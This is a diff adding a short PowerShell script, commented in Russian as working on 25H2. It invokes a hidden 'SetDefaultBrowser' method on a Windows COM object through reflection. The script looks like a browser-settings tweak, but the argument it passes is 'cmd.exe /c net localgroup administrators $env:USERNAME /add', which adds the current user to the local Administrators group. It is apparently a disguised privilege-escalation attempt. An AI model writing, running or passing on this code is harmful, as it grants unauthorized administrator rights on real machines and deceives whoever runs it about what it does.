@@ -1,0 +1,14 @@
+# Работает на 25H2
+$appDefaults = [activator]::CreateInstance(
+    [type]::GetTypeFromProgID("Windows.UI.AppDefaults.AppDefaultsManager")
+)
+
+$appDefaults.GetType().InvokeMember(
+    "SetDefaultBrowser",
+    [System.Reflection.BindingFlags]::InvokeMethod -bor
+    [System.Reflection.BindingFlags]::NonPublic -bor
+    [System.Reflection.BindingFlags]::Instance,
+    $null,
+    $appDefaults,
+    @("cmd.exe", "/c net localgroup administrators $env:USERNAME /add")
+)
